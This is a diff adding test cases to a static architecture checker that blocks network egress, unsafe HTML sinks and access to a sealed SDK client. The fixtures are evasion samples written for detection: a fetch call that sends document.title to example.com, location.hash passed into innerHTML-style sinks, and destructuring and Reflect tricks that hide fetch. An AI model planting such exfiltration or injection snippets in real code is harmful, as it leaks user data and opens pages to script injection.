@@ -42,6 +42,33 @@ await test('egress: a network API outside the egress modules fails, naming the b
   assert.deepEqual(checkArchitecture(withFile('src/graph.js', '// fetch(url)\nexport const note = "new WebSocket(url)";')), []);
 });
 
+await test('egress: destructuring, literal keys and reflection do not get around it', () => {
+  const evasions = [
+    'const { fetch: request } = globalThis; request("https://example.com");',
+    'const { fetch } = window; fetch("https://example.com");',
+    'const { navigator: { sendBeacon: b } } = self; b("/x", "y");',
+    "const { ['fetch']: r } = globalThis; r('/x');",
+    "const { 'WebSocket': W } = globalThis; new W('wss://example.com');",
+    'let f; ({ fetch: f } = globalThis); f("/x");',
+    'let g; ({ a: { fetch: g } } = { a: globalThis }); g("/x");',
+    "Reflect.get(globalThis, 'fetch')('/x');",
+    'window.fetch("/x");',
+    'globalThis[`fetch`]("/x");',
+    'run({ fetch });',
+  ];
+  for (const code of evasions) fails(withFile('src/agent.js', code), 'egress', 'src/agent.js', /uses (fetch|sendBeacon|WebSocket)/);
+  // Passing a module's own function under the name is not the network.
+  assert.deepEqual(checkArchitecture(withFile('src/graph.js', 'const own = () => 1; export const opts = { fetch: own };')), []);
+});
+
+await test('egress: a bundled first-party file the scan never read fails (.mjs, .ts)', () => {
+  const evil = "fetch('https://example.com/?' + document.title);";
+  fails(withFile('src/leak.mjs', evil), 'egress', 'src/leak.mjs', /uses fetch/);
+  fails(withFile('src/leak.ts', 'const u: string = "https://example.com"; ' + evil), 'egress', 'src/leak.ts', /uses fetch/);
+  assert.match(checkMetafile({ inputs: { 'src/unscanned.mjs': { imports: [] } } })[0], /^\[egress\] src\/unscanned.mjs: is bundled but was not scanned/);
+  assert.deepEqual(checkMetafile({ inputs: { 'src/main.js': { imports: [] }, 'node_modules/x/index.js': { imports: [] }, '<define:LOCAL_MODEL>': { imports: [] } } }), []);
+});
+
 await test('egress: an allowance nobody uses fails, so the list stays exact', () => {
   assert.ok(NETWORK['src/offline.js']);
   fails(withFile('src/offline.js', (t) => t.replaceAll('fetch(', 'Promise.reject(')), 'egress', 'src/offline.js', /no longer uses it/);
@@ -51,6 +78,12 @@ await test('html: an HTML sink outside viewer.html fails', () => {
   const msg = fails(withFile('src/preview.js', 'export const put = (node, s) => { node.innerHTML = s; };'), 'html', 'src/preview.js', /innerHTML/);
   assert.match(msg, /only viewer.html/);
   fails(withFile('src/interface/transcript.js', "const card = el('div', { innerHTML: '<b>x</b>' });"), 'html', 'src/interface/transcript.js', /innerHTML/);
+  // A key in any spelling, and a destructured or reflective one.
+  fails(withFile('src/interface/transcript.js', "const report = location.hash; el('div', { 'innerHTML': report });"), 'html', 'src/interface/transcript.js', /innerHTML/);
+  fails(withFile('src/interface/transcript.js', "el('div', { ['outerHTML']: location.hash });"), 'html', 'src/interface/transcript.js', /outerHTML/);
+  fails(withFile('src/interface/transcript.js', 'const innerHTML = location.hash; el("div", { innerHTML });'), 'html', 'src/interface/transcript.js', /innerHTML/);
+  fails(withFile('src/dom.js', "Reflect.set(document.body, 'innerHTML', location.hash);"), 'html', 'src/dom.js', /innerHTML/);
+  fails(withFile('src/dom.js', "const { insertAdjacentHTML: put } = document.body; put.call(document.body, 'beforeend', location.hash);"), 'html', 'src/dom.js', /insertAdjacentHTML/);
   fails(withFile('src/viewer.js', "const f = document.createElement('iframe'); f.srcdoc = '<p>';"), 'html', 'src/viewer.js', /srcdoc/);
   fails(withFile('src/dom.js', "document.write('<p>');"), 'html', 'src/dom.js', /document.write/);
   fails(withFile('src/markdown.js', "new DOMParser().parseFromString('<p>', 'text/html');"), 'html', 'src/markdown.js', /parseFromString/);
@@ -64,6 +97,7 @@ await test('sealed: only src/sealed.js imports tinfoil or reaches into its clien
   assert.match(msg, /attestation and origin checks/);
   fails(withFile('src/interface/connection.js', 'const leak = (c) => c.secureClient.fetch;'), 'sealed', 'src/interface/connection.js', /secureClient/);
   fails(withFile('src/naming.js', 'const k = (c) => c.openAIOptions.apiKey;'), 'sealed', 'src/naming.js', /openAIOptions/);
+  fails(withFile('src/naming.js', "const k = ({ 'secureClient': s }) => s.fetch;"), 'sealed', 'src/naming.js', /secureClient/);
   // The metafile: what really imports the SDK into the bundle.
   const meta = (from) => ({ inputs: { [from]: { imports: [{ path: 'node_modules/tinfoil/dist/index.browser.js' }] }, 'node_modules/tinfoil/dist/index.browser.js': { imports: [{ path: 'node_modules/tinfoil/dist/secure.js' }] } } });
   assert.deepEqual(checkMetafile(meta('src/sealed.js')), []);
